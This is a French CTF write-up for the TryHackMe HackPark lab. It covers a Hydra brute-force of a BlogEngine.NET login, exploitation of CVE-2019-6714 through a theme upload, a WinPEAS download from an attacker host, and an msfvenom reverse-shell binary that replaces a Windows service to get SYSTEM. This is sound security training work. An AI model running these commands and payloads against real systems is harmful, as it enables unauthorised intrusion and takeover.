---
layout: post
title: "TryHackMe - HackPark"
date: 2026-01-29 20:00:00 +0100
author: Howl
categories: [ctf]
tags: [windows, hydra, brute-force, blogengine, rce, winpeas, privesc, hard]
platform: tryhackme
difficulty: hard
excerpt: "Machine Windows avec brute-force Hydra sur un login BlogEngine.NET, exploitation d'un RCE (CVE-2019-6714), puis escalade via un service Windows personnalisé découvert avec WinPEAS."
---

## Informations

| Champ       | Valeur              |
|-------------|---------------------|
| Plateforme  | TryHackMe           |
| OS          | Windows             |
| Difficulté  | Hard                |
| Room        | HackPark            |

---

## Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 <IP>
```

```
80/tcp   open  http     Microsoft IIS 8.5
3389/tcp open  ms-wbt-server
```

On trouve **BlogEngine.NET** en visitant le site. La page de login est `/Account/login.aspx`.

---

## Brute Force avec Hydra

On capture la requête POST avec Burp Suite :

```
__VIEWSTATE=...&__EVENTVALIDATION=...&ctl00$MainContent$LoginUser$UserName=admin&ctl00$MainContent$LoginUser$Password=test&ctl00$MainContent$LoginUser$LoginButton=Log+in
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> \
  http-post-form "/Account/login.aspx:__VIEWSTATE=<VALUE>&...UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

Résultat : `admin:1qaz2wsx`

---

## Exploitation — CVE-2019-6714

BlogEngine.NET 3.3.6 est vulnérable à une **Path Traversal + RCE** via l'upload de fichier de thème.

```bash
searchsploit blogengine
# BlogEngine.NET 3.3.6 - Directory Traversal / RCE
```

On modifie le payload avec notre IP et port, on l'uploade dans le File Manager en renommant vers `PostView.ascx`, puis on déclenche l'exécution :

```
http://<IP>/?theme=../../App_Data/files
```

On obtient un shell en tant que `iis apppool\blog`.

---

## Élévation de privilèges

### Énumération avec WinPEAS

```powershell
# Upload WinPEAS.exe
Invoke-WebRequest -Uri "http://10.10.14.X:8000/winPEAS.exe" -OutFile "C:\Windows\Temp\winpeas.exe"
.\winpeas.exe
```

WinPEAS identifie un service avec un **binary path non quoté et modifiable** :

```
WindowsScheduler - C:\PROGRA~2\SYSTEM~1\WService.exe
```

### Exploitation du service

```bash
# Sur notre machine
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.X LPORT=5555 -f exe > WService.exe
```

On remplace le binaire, on redémarre le service, et on récupère un shell **SYSTEM** !

---

## Flags

```
User flag : 9af8a61...   — C:\Users\jeff\Desktop\user.txt
Root flag : 7e13d9...    — C:\Users\Administrator\Desktop\root.txt
```

---

## Conclusion

HackPark est une room complète qui couvre : la reconnaissance web, le brute force, l'exploitation d'un CMS vulnérable, et la privesc Windows via un service mal configuré.

**Outils :** `nmap`, `hydra`, `burpsuite`, `searchsploit`, `msfvenom`, `winPEAS`
